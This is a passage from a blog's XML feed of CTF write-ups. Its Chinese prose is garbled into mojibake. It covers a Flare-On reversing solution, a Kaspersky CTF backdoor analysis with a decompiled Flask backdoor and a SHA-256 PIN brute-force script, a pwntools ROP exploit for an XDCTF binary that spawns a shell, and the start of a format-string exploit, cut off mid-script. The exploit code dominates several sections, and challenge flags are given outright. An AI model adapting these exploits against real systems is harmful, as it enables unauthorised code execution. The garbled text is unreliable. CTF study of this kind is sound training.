¹æ®éœ€è¦æå‰æ¸¸æˆçŠ¶æ€ã€‚åœ¨è¿™ä¸ªåŠŸèƒ½ä¸­ï¼Œä½ å°†ä¼šçœ‹åˆ°æ¸¸æˆçŠ¶æ€ä¸­çš„æ›´å¤šå†…å®¹ï¼Œæ¯”å¦‚ä½ çš„æ’åï¼ˆä¾‹å¦‚â€œSeaman Recruitâ€ï¼‰ï¼š</p><h3 id="è§£é¢˜-3"><a href="#è§£é¢˜-3" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>å›åˆ°æ¸¸æˆæµç¨‹ã€‚æ¯è½®æ¸¸æˆä¸­ï¼Œä½ çš„è¾“å…¥å€¼é™¤äº†ä¼šå½±å“DiskStatuså¤–ï¼Œè¿˜ä¼šè¢«åŸæ ·æ”¾åˆ°ä¸Šé¢ç»“æ„ä½“çš„LastInputUpperCaseä¸­ã€‚å¦‚æœå¯¹åº”çš„ç‚¹åœ¨GoodStatusä¸­ä¸ºTrueï¼Œé‚£ä¹ˆå°±ç®—å‡»ä¸­ã€‚æ­¤å¤–ï¼Œæ¯è½®æ¸¸æˆä¸­ï¼Œchecksumå€¼éƒ½ä¼šå˜ï¼Œç”¨æ¥è§£å¯†ä¸‹ä¸€è½®æ¸¸æˆã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬é€šè¿‡è§£æ•°æ®çš„æ–¹å¼è§£å†³</p><div align=center>![](https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-flare-on-pewpewboat-04.jpg)</div><p>è¿™ä¸ªç¨‹åºç®—å‡ºæ¥çš„å€¼çš„å‰8ä¸ªå­—èŠ‚å°±æ˜¯è¿™å…³çš„è¿‡å…³å…³é”®</p><p>ä¾æ¬¡è¿‡å…³ä¹‹åä¼šå‡ºç°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aye! You found some letters did ya? To find what you<span class="string">&#x27;re looking for, you&#x27;</span>ll want to re-order them: 9, 1, 2, 7, 3, 5, 6, 5, 8, 0, 2, 3, 5, 6, 1, 4. Next you <span class="built_in">let</span> 13 ROT <span class="keyword">in</span> the sea! THE FINAL SECRET CAN BE FOUND WITH ONLY THE UPPER CASE</span><br></pre></td></tr></table></figure><p>çš„æç¤º</p><p>é‡æ–°ç»„ç»‡åœ°å›¾å­—æ¯FHGUZREJVOå¾—åˆ°OHGJURERVFGUREHZ<br>rot13ä¹‹åå¾—åˆ°BUTWHEREISTHERUM</p><p>ç›´æ¥è¾“å…¥åˆ°ç¨‹åºä¸­å°±å¾—åˆ°flagäº†ã€‚ã€‚</p><p><a href="mailto:&#x79;&#48;&#x75;&#x5f;&#x5f;&#x73;&#x55;&#110;&#75;&#95;&#x6d;&#89;&#x5f;&#95;&#x50;&#x33;&#x57;&#112;&#x33;&#119;&#95;&#x62;&#48;&#x34;&#x74;&#64;&#102;&#x6c;&#97;&#114;&#x65;&#45;&#x6f;&#110;&#46;&#99;&#111;&#x6d;">&#x79;&#48;&#x75;&#x5f;&#x5f;&#x73;&#x55;&#110;&#75;&#95;&#x6d;&#89;&#x5f;&#95;&#x50;&#x33;&#x57;&#112;&#x33;&#119;&#95;&#x62;&#48;&#x34;&#x74;&#64;&#102;&#x6c;&#97;&#114;&#x65;&#45;&#x6f;&#110;&#46;&#99;&#111;&#x6d;</a></p><p>ä»Šæ™šå…ˆå†™åˆ°è¿™ã€‚ã€‚æ˜å¤©ç»§ç»­å†™</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><h2 id="çªç„¶å‘ç°å›½å†…æœ‰æœ‰äººå†™çš„æŒºå®Œæ•´çš„-æˆ‘å°±ä¸ç»§ç»­å¾€ä¸‹å†™äº†"><a href="#çªç„¶å‘ç°å›½å†…æœ‰æœ‰äººå†™çš„æŒºå®Œæ•´çš„-æˆ‘å°±ä¸ç»§ç»­å¾€ä¸‹å†™äº†" class="headerlink" title="çªç„¶å‘ç°å›½å†…æœ‰æœ‰äººå†™çš„æŒºå®Œæ•´çš„ æˆ‘å°±ä¸ç»§ç»­å¾€ä¸‹å†™äº†"></a>çªç„¶å‘ç°å›½å†…æœ‰æœ‰äººå†™çš„æŒºå®Œæ•´çš„ æˆ‘å°±ä¸ç»§ç»­å¾€ä¸‹å†™äº†</h2><p>çªç„¶å‘ç°å›½å†…æœ‰æœ‰äººå†™çš„æŒºå®Œæ•´çš„ æˆ‘å°±ä¸ç»§ç»­å¾€ä¸‹å†™äº†<br>é™„ä¸Šè¿æ¥<br><a href="http://blog.nsfocus.net/flare-onchallenge4th/">http://blog.nsfocus.net/flare-onchallenge4th/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> Flare on </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kaspersky Industrial CTF Quals 2017 - Backdoor Pi</title>
      <link href="2017-Kaspersky-Industrial-CTF-Quals-Backdoor-Pi.html"/>
      <url>2017-Kaspersky-Industrial-CTF-Quals-Backdoor-Pi.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/fs$ ls var/spool/cron/crontabs/</span><br><span class="line">b4ckd00r_us3r  pi</span><br></pre></td></tr></table></figure><p>æˆ‘å¯ä»¥çœ‹åˆ°æœ‰ç»™åé—¨è´¦æˆ·</p><p>æˆ‘ä»¬æ£€æŸ¥è¿™ä¸ªè´¦æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/fs$ cat var/spool/cron/crontabs/b4ckd00r_us3r </span><br><span class="line"><span class="comment"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span></span><br><span class="line"><span class="comment"># (/tmp/crontab.80NKS4/crontab installed on Wed Oct  4 19:28:12 2017)</span></span><br><span class="line"><span class="comment"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">@reboot python /bin/back</span><br></pre></td></tr></table></figure><p>å‘ç°python è¿è¡Œäº†ä¸€ä¸ª /bin/bashçš„æ–‡ä»¶</p><p>æˆ‘ä»¬å»æŸ¥çœ‹æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/fs$ file bin/back</span><br><span class="line">bin/back: python 2.7 byte-compiled</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯ç¼–è¯‘åçš„pythonæ–‡ä»¶</p><p>åç¼–è¯‘å¾—åˆ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 2.12.0</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># [GCC 6.3.0 20170118]</span></span><br><span class="line"><span class="comment"># Embedded file name: back.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2017-10-05 09:09:10</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> abort</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_creds</span>(<span class="params">user, pincode</span>):</span></span><br><span class="line">    <span class="keyword">if</span> len(pincode) &lt;= <span class="number">8</span> <span class="keyword">and</span> pincode.isdigit():</span><br><span class="line">        val = <span class="string">&#x27;&#123;&#125;:&#123;&#125;&#x27;</span>.format(user, pincode)</span><br><span class="line">        key = hashlib.sha256(val).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">&#x27;34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Congr4ts, you found the b@ckd00r. The fl4g is simply : &#123;&#125;:&#123;&#125;&#x27;</span>.format(user, pincode)</span><br><span class="line">    <span class="keyword">return</span> abort(<span class="number">404</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;HOME&lt;/h1&gt;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/backdoor&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">    user = request.args.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    pincode = request.args.get(<span class="string">&#x27;pincode&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> check_creds(user, pincode)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(threaded=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">3333</span>)</span><br><span class="line"><span class="comment"># okay decompiling back.pyc</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥è·å–ä¸€ä¸ªhashçš„å€¼ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/fs$ cat etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">pi:x:1000:1000:,,,:/home/pi:/bin/bash</span><br><span class="line">sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ntp:x:102:104::/home/ntp:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:103:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:104:106::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">usbmux:x:105:46:usbmux daemon,,,:/home/usbmux:/bin/<span class="literal">false</span></span><br><span class="line">lightdm:x:106:109:Light Display Manager:/var/lib/lightdm:/bin/<span class="literal">false</span></span><br><span class="line">avahi:x:107:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/<span class="literal">false</span></span><br><span class="line">b4ckd00r_us3r:x:1001:1004::/home/b4ckd00r_us3r:/bin/bash</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å·²ç»çŸ¥é“çš„æ˜¯  b4ckd00r_us3r  æˆ‘ä»¬åªéœ€è¦ç¡®å®šå‰©ä¸‹çš„ä½æ•°å°±è¡Œäº†ã€‚å¯ä»¥åšä¸ªæš´åŠ›ç ´è§£çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">a = <span class="string">&#x27;34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> range(<span class="number">10000000</span>,<span class="number">99999999</span>):</span><br><span class="line">    b = <span class="string">&#x27;b4ckd00r_us3r:%08d&#x27;</span>% (i1)</span><br><span class="line">    key = hashlib.sha256(b).hexdigest()</span><br><span class="line">    <span class="keyword">print</span> b,key</span><br><span class="line">    <span class="keyword">if</span> key== a:</span><br><span class="line">        <span class="keyword">print</span> b</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æœ€åçš„ç»“æœæ˜¯<code>b4ckd00r_us3r:12171337</code></p><p>flagæ˜¯ï¼šKLCTF{b4ckd00r_us3r:12171337}</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> Kaspersky Industrial CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 XDCTF Writeup</title>
      <link href="2017-XDCTF-Pwn-Writeup.html"/>
      <url>2017-XDCTF-Pwn-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="easyeasy"><a href="#easyeasy" class="headerlink" title="easyeasy"></a>easyeasy</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/home/swing/Desktop/CTF-Pwn/xdctf/easyeasy/easyeasy&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-01" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-01"></a></p><p>è¿™ä¸ªåœ°æ–¹å¯ä»¥åšinfo leak<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-eayeasy-02" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-eayeasy-02"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-03.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-04.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-05.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-07.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-07.jpg"></a></p><p>å½“æˆ‘ä»¬è§¦å‘ ç›®æ ‡æ­»äº¡å½“é‚£ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œå®ƒä¼šåœ¨å½“å‰ç»“æ„ä½“åœ°å€+idçš„åœ°å€å†™å…¥luckynumçš„æœ€åä¸€ä½byte<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-08.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-08.jpg"></a><br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-09.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-09.jpg"></a><br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-10.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-10.jpg"></a><br>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œè·³è½¬åˆ°0x400aaf,<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-12.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-12.jpg"></a><br>ç´§æ¥ç€æˆ‘ä»¬å°±å¯ä»¥åšä¸€æ¬¡æ ˆæº¢å‡ºäº†ã€‚ã€‚ã€‚</p><p><a href="./_image/2017-10-09-20-54-03.jpg" class="gallery-item"><img src="./_image/2017-10-09-20-54-03.jpg"></a></p><p>æ„é€ rop </p><h3 id="exploit-ç¼–å†™"><a href="#exploit-ç¼–å†™" class="headerlink" title="exploit ç¼–å†™"></a>exploit ç¼–å†™</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    debug = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug :</span><br><span class="line">    io = process(<span class="string">&quot;./easyeasy&quot;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&quot;./easyeasy&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">    system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_offset = next(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip,por)</span><br><span class="line">    context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">len_weapon,weapon_name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;exit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">    io.sendline(str(len_weapon))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">    io.sendline(str(weapon_name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shot</span>(<span class="params">target</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;exit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;C++\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;id:\n&quot;</span>)</span><br><span class="line">    io.sendline(str(target))</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;break *0x400AA0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Your name :&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) <span class="number">-0x3c3750</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libc_base: %s&quot;</span> % hex(libc_base))</span><br><span class="line">pause()</span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">shot(<span class="number">0x20</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;exit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;C++&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;loop 3 over&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;luckynum:\n&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(str(<span class="number">0xafafafaf</span>))</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x4010b3</span>) <span class="comment">#pop rdi ret</span></span><br><span class="line">payload += p64(libc_base + binsh_offset)</span><br><span class="line">payload += p64(libc_base + system_offset)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> XDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BackdoorCTF 2017 Pwn Writeup</title>
      <link href="2017-backdoor-CTF-Pwn.html"/>
      <url>2017-backdoor-CTF-Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="BABY-0x41414141"><a href="#BABY-0x41414141" class="headerlink" title="BABY-0x41414141"></a>BABY-0x41414141</h2><p>eaysy fmt vul</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;163.172.176.29&#x27;, 9035)</span></span><br><span class="line">io = process(<span class="string">&#x27;./32_new&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print io.recvline()</span></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&#x27;Hello baby pwner, whats your name?\n&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">72</span>/<span class="number">4</span>+<span class="number">60</span>, &#123;<span class="number">0x804a034</span>:<span class="number">0x0804870b</span>&#125;,numbwritten=<span class="number">72</span>,write_size = <span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line"></span><br><span class="line">raw_input(<span 